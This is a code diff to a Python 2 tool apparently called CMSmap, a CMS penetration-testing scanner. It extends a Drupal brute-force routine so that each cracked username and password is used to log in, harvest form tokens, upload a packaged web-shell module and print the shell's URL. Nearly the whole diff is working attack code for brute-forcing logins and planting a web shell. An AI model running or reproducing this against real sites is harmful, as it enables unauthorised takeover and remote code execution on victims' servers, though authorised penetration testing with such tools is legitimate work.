@@ -847,7 +847,8 @@ class BruteForcer:
                 PostExploit(self.url).JooShell(JooCredential[0], JooCredential[1])
 
         def Drurun(self):
-            self.drulogin = "/?q=user/login";
+            self.drulogin = "/?q=user/login"
+            self.DruValidCredentials = []
             for user in self.usrlist:
                 for pwd in self.pswlist:
                     query_args = {"name": user ,"pass": pwd, "form_id":"user_login"}
@@ -860,12 +861,14 @@ class BruteForcer:
                         if re.findall(re.compile('Sorry, too many failed login attempts from your IP address.'),htmltext):
                             print "[!] Account Lockout Enabled: Your IP address has been temporary blocked. Try it later or from a different IP address"
                             return
-                              
                     except urllib2.HTTPError, e:
                         #print e.code
                         if e.code == 403:
                             print "[*] Valid Credentials: "+user+" "+pwd
-                
+                            self.DruValidCredentials.append([user,pwd]) 
+            for DruCredential in self.DruValidCredentials :
+                PostExploit(self.url).DruShell(DruCredential[0], DruCredential[1])
+              
 class PostExploit:
     def __init__(self,url):
         self.url = url
@@ -963,7 +966,7 @@ class PostExploit:
         cookieJar.clear()
         try:
             # HTTP POST Request
-            if verbose : print "[-] Logging in the target website ..."
+            if verbose : print "[-] Logging into the target website ..."
             # Get Token and Session Cookie
             htmltext = opener.open(self.url+self.joologin).read()
             reg = re.compile('<input type="hidden" name="([a-zA-z0-9]{32})" value="1"')
@@ -1062,6 +1065,46 @@ class PostExploit:
             # print e.code
             pass
 
+    def DruShell(self,user,password):
+        self.drulogin = "/?q=user/login"
+        self.drupModules = "/?q=admin/modules"
+        self.druAuthorize = "/authorize.php?batch=1&op=do"
+        self.druInstall = "/?q=admin/modules/install"
+        # Set cookies
+        cookieJar = cookielib.CookieJar()
+        cookieHandler = urllib2.HTTPCookieProcessor(cookieJar)
+        opener = urllib2.build_opener(cookieHandler,multipartpost.MultipartPostHandler)
+        opener.addheaders = [('User-agent','Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.14) Gecko/20110201 Firefox/2.0.0.14')]
+        cookieJar.clear()        
+        try:
+            # HTTP POST Request
+            if verbose : print "[-] Logging into the target website..."
+            # Logging into the website with username and password
+            self.query_args_login = {"name": user ,"pass": password, "form_id":"user_login"}
+            data = urllib.urlencode(self.query_args_login)
+            htmltext = opener.open(self.url+self.drulogin, data).read()
+            # Get Token and Build id in Upload Page
+            htmltext = opener.open(self.url+self.druInstall).read()
+            self.token = re.findall(re.compile('<input type="hidden" name="form_token" value="(.+?)"'),htmltext)
+            self.form_buildid = re.findall(re.compile('<input type="hidden" name="form_build_id" value="(.+?)"'),htmltext)
+            # Upload Module
+            self.params = { "files[project_upload]" : open("shell/dru-shell.zip", "rb") , "form_build_id":self.form_buildid[0],"form_token":self.token[0],"form_id":"update_manager_install_form","op":"Install"}
+            htmltext = opener.open(self.url+self.druInstall, self.params).read()
+            self.dru_id = re.findall(re.compile('id=(.+?)&'),htmltext)
+            try:
+                htmltext = opener.open(self.url+"/authorize.php?batch=1&op=start&id="+self.dru_id[0]).read()
+                if re.search("Installing drushell",htmltext):
+                    print_red("[!] CMSmap Drupal Shell Module Installed")
+                    print_red_bold("[!] Web Shell: "+self.url+"/sites/all/modules/drushell/shell.php")
+                    print_yellow("[-] Remember to delete CMSmap Drupal Shell Module")
+            except IndexError :
+                if verbose : print "[-] Unable to install CMSmap Drupal Shell Module. Check if it is already installed"
+        except urllib2.HTTPError, e:
+            # print e.code
+            pass
+
+      
+        
 class GenericChecks:
     def __init__(self,url):
         self.url = url
